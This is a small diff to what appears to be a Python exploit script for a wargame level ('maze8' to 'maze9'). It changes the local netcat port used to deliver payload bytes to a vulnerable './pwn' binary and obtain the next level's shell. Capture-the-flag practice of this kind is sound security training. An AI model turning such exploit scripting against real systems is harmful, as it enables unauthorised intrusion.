@@ -30,7 +30,7 @@ def execute_payload(sh):
     shell = sh.run(b'./pwn')
 
     #Run netcat on server, then send netcat the vuln bytes
-    ncshell = sh.run('netcat localhost 5959')
+    ncshell = sh.run('netcat localhost 6969')
     ncshell.sendline(payload_bytes)
 
     #Should establish maze9 shell on the shell that executed maze8
